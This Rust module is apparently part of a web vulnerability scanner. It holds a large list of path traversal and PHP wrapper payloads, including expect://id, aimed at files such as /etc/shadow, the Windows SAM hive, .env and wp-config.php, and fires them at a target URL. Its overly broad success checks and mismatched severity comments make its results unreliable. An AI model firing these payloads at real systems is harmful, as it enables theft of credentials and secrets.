//! Path Traversal / Directory Traversal vulnerability scanner
//!
//! Detects path traversal vulnerabilities through various encoding techniques
//! and common parameter names. Uses comprehensive payload wordlist.

use crate::scanners::{ScanReport, ScannerConfig, Target, Vuln, VulnSeverity};
use anyhow::Result;
use reqwest::Client;
use std::time::Duration;

/// Comprehensive path traversal payloads from wordlist
const PATH_TRAVERSAL_PAYLOADS: &[(&str, &str, &str)] = &[
    // (payload, technique, expected_signature)
    // Linux basic path traversal
    ("../../../etc/passwd", "basic_unix", "root:"),
    ("../../../../etc/passwd", "deep_unix", "root:"),
    ("../../../../../etc/passwd", "extended_unix", "root:"),
    ("../../../../../../etc/passwd", "very_deep_unix", "root:"),
    ("../../../../../../../../etc/passwd", "extreme_unix", "root:"),
    ("../../../../../../../../../../etc/passwd", "maximum_unix", "root:"),

    // Linux /etc/shadow
    ("../../../etc/shadow", "shadow_file", "nobody:"),
    ("../../../../etc/shadow", "shadow_deep", "nobody:"),

    // Linux /etc/hosts
    ("../../../etc/hosts", "hosts_file", "localhost"),
    ("../../../../etc/hosts", "hosts_deep", "localhost"),

    // Linux /proc
    ("../../../proc/self/environ", "proc_environ", "PATH="),
    ("../../../../proc/self/environ", "proc_environ_deep", "PATH="),
    ("../../../proc/self/cmdline", "proc_cmdline", "/"),

    // Linux /var/log
    ("../../../var/log/apache2/access.log", "apache_access_log", "Apache"),
    ("../../../var/log/apache2/error.log", "apache_error_log", "[error]"),
    ("../../../var/log/nginx/access.log", "nginx_access_log", "nginx"),
    ("../../../var/log/nginx/error.log", "nginx_error_log", "error"),

    // Windows basic path traversal
    ("..\\..\\..\\windows\\system32\\drivers\\etc\\hosts", "basic_windows", "localhost"),
    ("..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts", "deep_windows", "localhost"),
    ("..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts", "extended_windows", "localhost"),
    ("..\\..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts", "very_deep_windows", "localhost"),

    // Windows win.ini
    ("..\\..\\..\\windows\\win.ini", "win_ini", "[extensions]"),
    ("..\\..\\..\\..\\windows\\win.ini", "win_ini_deep", "[fonts]"),
    ("..\\..\\..\\..\\..\\windows\\win.ini", "win_ini_extended", "[extensions]"),

    // Windows boot.ini
    ("..\\..\\..\\boot.ini", "boot_ini", "[boot]"),
    ("..\\..\\..\\..\\boot.ini", "boot_ini_deep", "[operating systems]"),

    // Windows system32
    ("..\\..\\..\\windows\\system32\\config\\sam", "sam_file", ""),
    ("..\\..\\..\\windows\\system32\\config\\system", "system_config", ""),
    ("..\\..\\..\\windows\\system32\\config\\security", "security_config", ""),

    // URL encoded
    ("%2e%2e%2fetc%2fpasswd", "url_encoded", "root:"),
    ("%2e%2e%2fetc%2fpasswd%00", "url_encoded_null", "root:"),
    ("%2e%2e%2fetc%2fpasswd%00.jpg", "url_encoded_null_jpg", "root:"),
    ("%2e%2e%2fetc%2fpasswd%00.png", "url_encoded_null_png", "root:"),
    ("%2e%2e%2fetc%2fpasswd%00.html", "url_encoded_null_html", "root:"),
    ("%2e%2e%5cetc%2fpasswd", "url_encoded_mixed", "root:"),
    ("%2e%2e%5cetc%5chosts", "url_encoded_windows", "localhost"),

    // Double encoding
    ("%252e%252e%252fetc%252fpasswd", "double_encoded", "root:"),
    ("%252e%252e%255cetc%255chosts", "double_encoded_win", "localhost"),
    ("%252e%252e%252fetc%252fpasswd%2500.jpg", "double_null", "root:"),
    ("%2525%252e%2525%252e%2525%252fetc%2525%252fpasswd", "triple_encoded", "root:"),

    // UTF-8 Unicode encoding
    ("%c0%ae%c0%ae%c0%afetc%c0%afpasswd", "unicode_bypass", "root:"),
    ("%c0%ae%c0%ae%c0%afetc%c0%afpasswd%00.jpg", "unicode_null", "root:"),
    ("%e0%80%ae%e0%80%ae%e0%80%afetc%e0%80%afpasswd", "overlong_unicode", "root:"),
    ("%f0%80%80%ae%f0%80%80%ae%f0%80%80%afetc%f0%80%80%afpasswd", "full_unicode", "root:"),

    // Null byte injection
    ("../../../etc/passwd%00", "null_byte", "root:"),
    ("../../../etc/passwd%00.jpg", "null_jpg", "root:"),
    ("../../../etc/passwd%00.png", "null_png", "root:"),
    ("../../../etc/passwd%00.html", "null_html", "root:"),
    ("../../../etc/passwd%00.php", "null_php", "root:"),
    ("../..\\..\\..\\..\\..windows\\win.ini%00", "null_win", "[extensions]"),

    // Path bypass techniques
    ("....//....//....//etc/passwd", "dot_slash_bypass", "root:"),
    ("....//....//....//etc/passwd%00.jpg", "dot_slash_null", "root:"),
    ("....//....//etc/passwd", "partial_dot_slash", "root:"),
    ("....////etc/passwd", "multi_slash", "root:"),
    ("..../..../..../etc/passwd", "double_dot_dot", "root:"),
    ("..././..././etc/passwd", "mixed_dots", "root:"),

    // Mixed slashes
    ("..\\..\\..\\..\\..\\..\\..\\..\\etc/passwd", "mixed_slash_unix", "root:"),
    ("../../../../../windows\\system32\\drivers\\etc\\hosts", "mixed_slash_win", "localhost"),
    ("..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd", "mixed_backslash", "root:"),
    ("..%2f..%2f..%2fetc%2fpasswd", "mixed_encoding", "root:"),
    ("..%5c..%5c..%5cetc%5cpasswd", "mixed_backslash_enc", "root:"),
    ("..%255c..%255c..%255cwindows%255cwin.ini", "double_backslash", "[extensions]"),

    // Absolute path bypass
    ("/etc/passwd", "absolute_unix", "root:"),
    ("/etc/shadow", "absolute_shadow", "nobody:"),
    ("/etc/hosts", "absolute_hosts", "localhost"),
    ("/proc/self/environ", "absolute_proc", "PATH="),
    ("/windows/system32/drivers/etc/hosts", "absolute_windows", "localhost"),

    // Common web files
    ("../../../.env", "env_file", "DB_PASSWORD"),
    ("../../../.env.local", "env_local", "DB_"),
    ("../../../.htaccess", "htaccess", "RewriteRule"),
    ("../../../config.php", "config_php", "<?php"),
    ("../../../wp-config.php", "wp_config", "DB_PASSWORD"),
    ("../../../web.config", "web_config", "<configuration>"),
    ("../../../composer.json", "composer_json", "dependencies"),
    ("../../../package.json", "package_json", "\"dependencies\""),

    // Hidden directories
    ("../../../.git/config", "git_config", "[core]"),
    ("../../../.git/HEAD", "git_head", "ref:"),
    ("../../../.svn/entries", "svn_entries", "svn:"),
    ("../../../.hg/", "hg_dir", ""),

    // Backup files
    ("../../../backup.sql", "backup_sql", "INSERT INTO"),
    ("../../../dump.sql", "dump_sql", "mysqldump"),
    ("../../../database.sql", "database_sql", "CREATE TABLE"),

    // Source code
    ("../../../index.php", "index_php", "<?php"),
    ("../../../index.php.bak", "index_bak", "<?php"),
    ("../../../main.py", "main_py", "def "),
    ("../../../app.js", "app_js", "function "),
];

/// Parameter names commonly used for file operations
const TRAVERSAL_PARAMS: &[&str] = &[
    "file", "path", "image", "document", "page", "view", "dir", "folder",
    "filename", "src", "template", "asset", "download", "content", "load",
    "include", "require", "open", "read", "config", "lang", "locale",
    "style", "theme", "skin", "layout", "resource", "attachment", "data",
];

pub struct PathTraversalScanner {
    client: Client,
    config: ScannerConfig,
}

impl PathTraversalScanner {
    pub fn new(config: ScannerConfig) -> Self {
        let timeout = Duration::from_secs(15);
        let client = Client::builder()
            .timeout(timeout)
            .user_agent(&config.user_agent)
            .redirect(reqwest::redirect::Policy::limited(3))
            .build()
            .expect("Failed to create HTTP client");

        Self { client, config }
    }

    pub async fn scan(&self, url: &str) -> Result<ScanReport> {
        let mut report = ScanReport::new(Target::Url(url.to_string()));

        // Test all payloads from wordlist
        for (payload, technique, signature) in PATH_TRAVERSAL_PAYLOADS {
            if self.config.aggressive || technique.contains("basic") || technique.contains("absolute") {
                report.merge(self.test_payload(url, payload, technique, signature).await?);
            }
        }

        // Additional checks in aggressive mode
        if self.config.aggressive {
            report.merge(self.check_wrapper_bypass(url).await?);
            report.merge(self.check_parameter_pollution(url).await?);
        }

        Ok(report)
    }

    /// Test a single payload against all common parameters
    async fn test_payload(&self, base_url: &str, payload: &str, technique: &str, signature: &str) -> Result<ScanReport> {
        let mut report = ScanReport::new(Target::Url(base_url.to_string()));

        for param in TRAVERSAL_PARAMS {
            let test_url = if base_url.contains('?') {
                format!("{}&{}={}", base_url, param, urlencoding::encode(payload))
            } else {
                format!("{}?{}={}", base_url, param, urlencoding::encode(payload))
            };

            if let Ok(response) = self.client.get(&test_url).send().await {
                if let Ok(text) = response.text().await {
                    let text_lower = text.to_lowercase();

                    // Check for success signatures
                    if self.check_success_indicators(&text, &text_lower, signature, technique) {
                        let severity = self.determine_severity(technique, signature);

                        report.add_finding(Vuln {
                            severity,
                            title: format!("Path Traversal: {}", technique),
                            description: format!(
                                "Path traversal vulnerability in parameter '{}'. Successfully accessed file using '{}' technique.",
                                param, technique
                            ),
                            location: Some(test_url),
                            recommendation: Some("Validate and sanitize all file path inputs. Use a whitelist of allowed files. Use basename() or equivalent. Avoid using user input directly in file system operations.".to_string()),
                            cwe: Some("CWE-22".to_string()),
                            owasp: Some("A01:2021 - Broken Access Control".to_string()),
                        });

                        // Don't report the same vulnerability multiple times
                        break;
                    }
                }
            }
        }

        Ok(report)
    }

    /// Check if response indicates successful path traversal
    fn check_success_indicators(&self, text: &str, text_lower: &str, signature: &str, technique: &str) -> bool {
        // Direct signature match
        if text.contains(signature) || text_lower.contains(&signature.to_lowercase()) {
            return true;
        }

        // Common Unix file indicators
        if text_lower.contains("root:") || text_lower.contains("/bin/bash") || text_lower.contains("/usr/bin") {
            return true;
        }

        // Common Windows file indicators
        if text_lower.contains("[extensions]") || text_lower.contains("[fonts]") || text_lower.contains("directory of") {
            return true;
        }

        // Configuration file indicators
        if technique.contains("env") && (text.contains("DB_PASSWORD") || text.contains("DATABASE_URL")) {
            return true;
        }

        if technique.contains("php") && (text.contains("<?php") || text.contains("require_once")) {
            return true;
        }

        // Source code indicators
        if text_lower.contains("function ") || text_lower.contains("class ") || text_lower.contains("import ") {
            return true;
        }

        // Git indicators
        if text_lower.contains("[core]") || text_lower.contains("repositoryurl") {
            return true;
        }

        // Process environment indicators
        if text_lower.contains("path=") || text_lower.contains("user=") || text_lower.contains("home=") {
            return true;
        }

        false
    }

    /// Determine severity based on technique and target
    fn determine_severity(&self, technique: &str, _signature: &str) -> VulnSeverity {
        // Critical: sensitive config files, source code, etc.
        if technique.contains("env") || technique.contains("wp_config") || technique.contains("git") {
            return VulnSeverity::Critical;
        }

        // Critical: SAM database, shadow file
        if technique.contains("sam") || technique.contains("shadow") {
            return VulnSeverity::Critical;
        }

        // High: /etc/passwd, win.ini, source code
        if technique.contains("passwd") || technique.contains("win.ini") || technique.contains("boot") {
            return VulnSeverity::Critical;
        }

        // High: SQL dumps, backup files
        if technique.contains("sql") || technique.contains("backup") {
            return VulnSeverity::Critical;
        }

        // High: encoding bypasses
        if technique.contains("unicode") || technique.contains("double") || technique.contains("mixed") {
            return VulnSeverity::High;
        }

        // High: null byte injection
        if technique.contains("null") {
            return VulnSeverity::High;
        }

        // Medium: basic traversal that gets past simple filters
        if technique.contains("bypass") || technique.contains("dot_slash") {
            return VulnSeverity::High;
        }

        // Medium: config files, logs
        if technique.contains("config") || technique.contains("log") {
            return VulnSeverity::Medium;
        }

        // Medium: source files
        if technique.contains("php") || technique.contains("py") || technique.contains("js") {
            return VulnSeverity::Medium;
        }

        VulnSeverity::Medium
    }

    /// Check for PHP wrapper bypass
    async fn check_wrapper_bypass(&self, base_url: &str) -> Result<ScanReport> {
        let mut report = ScanReport::new(Target::Url(base_url.to_string()));

        let wrappers = &[
            ("php://filter/convert.base64-encode/resource=index.php", "php_filter", "PD9waHAg"),
            ("php://filter/read=convert.base64-encode/resource=config.php", "php_config", "PD9"),
            ("file:///etc/passwd", "file_wrapper", "root:"),
            ("expect://id", "expect_wrapper", "uid="),
            ("data://text/plain;base64,SGVsbG8=", "data_wrapper", "Hello"),
        ];

        for (wrapper, desc, sig) in wrappers {
            for param in &["file", "page", "document", "path"] {
                let test_url = if base_url.contains('?') {
                    format!("{}&{}={}", base_url, param, urlencoding::encode(wrapper))
                } else {
                    format!("{}?{}={}", base_url, param, urlencoding::encode(wrapper))
                };

                if let Ok(response) = self.client.get(&test_url).send().await {
                    if let Ok(text) = response.text().await {
                        if text.contains(sig) || text.contains("root:") || text.contains("uid=") {
                            report.add_finding(Vuln {
                                severity: VulnSeverity::Critical,
                                title: format!("PHP Wrapper RCE: {}", desc),
                                description: format!(
                                    "PHP wrapper vulnerability in parameter '{}'. This can lead to file disclosure or code execution.",
                                    param
                                ),
                                location: Some(test_url),
                                recommendation: Some("Disable PHP wrappers (allow_url_include=Off). Never include user-supplied files. Validate all file paths.".to_string()),
                                cwe: Some("CWE-98".to_string()),
                                owasp: Some("A03:2021 - Injection".to_string()),
                            });
                            break;
                        }
                    }
                }
            }
        }

        Ok(report)
    }

    /// Check for parameter pollution bypass
    async fn check_parameter_pollution(&self, base_url: &str) -> Result<ScanReport> {
        let mut report = ScanReport::new(Target::Url(base_url.to_string()));

        // Test with duplicate parameters
        let pollution_tests = &[
            ("file=/safe&file=../../../etc/passwd", "unix_pollution"),
            ("path=/safe&path=../../../etc/passwd", "path_pollution"),
            ("image=/safe&image=..\\..\\..\\windows\\win.ini", "windows_pollution"),
        ];

        for (payload, desc) in pollution_tests {
            let test_url = if base_url.contains('?') {
                format!("{}&{}", base_url, payload)
            } else {
                format!("{}?{}", base_url, payload)
            };

            if let Ok(response) = self.client.get(&test_url).send().await {
                if let Ok(text) = response.text().await {
                    let text_lower = text.to_lowercase();
                    if text_lower.contains("root:") || text_lower.contains("[extensions]") {
                        report.add_finding(Vuln {
                            severity: VulnSeverity::High,
                            title: format!("Path Traversal: Parameter Pollution ({})", desc),
                            description: "Parameter pollution allows bypassing validation. The last or first parameter takes precedence.".to_string(),
                            location: Some(test_url),
                            recommendation: Some("Handle duplicate parameters properly. Use only the first or last value consistently. Validate all values.".to_string()),
                            cwe: Some("CWE-22".to_string()),
                            owasp: Some("A01:2021 - Broken Access Control".to_string()),
                        });
                    }
                }
            }
        }

        Ok(report)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_scanner_creation() {
        let config = ScannerConfig::new();
        let scanner = PathTraversalScanner::new(config);
        // Scanner created successfully
        assert!(true);
    }

    #[test]
    fn test_payloads_loaded() {
        assert!(!PATH_TRAVERSAL_PAYLOADS.is_empty());
        assert!(PATH_TRAVERSAL_PAYLOADS.len() > 50);
    }

    #[test]
    fn test_params_loaded() {
        assert!(!TRAVERSAL_PARAMS.is_empty());
        assert!(TRAVERSAL_PARAMS.contains(&"file"));
        assert!(TRAVERSAL_PARAMS.contains(&"path"));
    }

    #[test]
    fn test_success_indicators() {
        let config = ScannerConfig::new();
        let scanner = PathTraversalScanner::new(config);

        // Unix passwd file
        assert!(scanner.check_success_indicators("root:x:0:0:root:/root:/bin/bash", "root:x:0:0", "root:", "basic"));

        // Windows ini file
        assert!(scanner.check_success_indicators("[extensions]\n[fonts]", "[extensions]", "[extensions]", "windows"));

        // Environment file
        assert!(scanner.check_success_indicators("DB_PASSWORD=secret", "db_password=secret", "DB_PASSWORD", "env"));
    }

    #[test]
    fn test_severity_determination() {
        let config = ScannerConfig::new();
        let scanner = PathTraversalScanner::new(config);

        // Critical techniques
        assert_eq!(scanner.determine_severity("env_file", "DB_PASSWORD"), VulnSeverity::Critical);
        assert_eq!(scanner.determine_severity("sam_file", ""), VulnSeverity::Critical);
        assert_eq!(scanner.determine_severity("basic_unix_passwd", "root:"), VulnSeverity::Critical);

        // High techniques
        assert_eq!(scanner.determine_severity("unicode_bypass", "root:"), VulnSeverity::High);
        assert_eq!(scanner.determine_severity("null_byte", "root:"), VulnSeverity::High);

        // Medium techniques
        assert_eq!(scanner.determine_severity("absolute_hosts", "localhost"), VulnSeverity::Medium);
    }
}
